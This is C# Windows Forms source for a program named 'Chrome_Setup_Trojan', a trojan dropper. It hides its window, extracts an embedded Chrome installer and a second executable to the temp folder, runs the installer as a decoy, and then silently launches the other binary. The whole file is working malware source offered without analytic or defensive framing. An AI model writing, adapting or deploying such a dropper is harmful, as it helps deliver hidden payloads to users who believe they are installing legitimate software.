using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Reflection;
using System.IO;
using System.Diagnostics;

namespace Chrome_Setup_Trojan
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            string temp = Path.GetTempPath();
            Extract("SETUP", temp, "Resources", "ChromeSetup.exe");
            Extract("SETUP", temp, "Resources", "asInvoker.exe");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            timer2.Start();
            string temp = Path.GetTempPath();
            Process.Start(temp+"ChromeSetup.exe");
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            string temp = Path.GetTempPath();
            Process.Start(temp+"asInvoker.exe");
            {
                Application.Exit();
            }
        }
    }
}
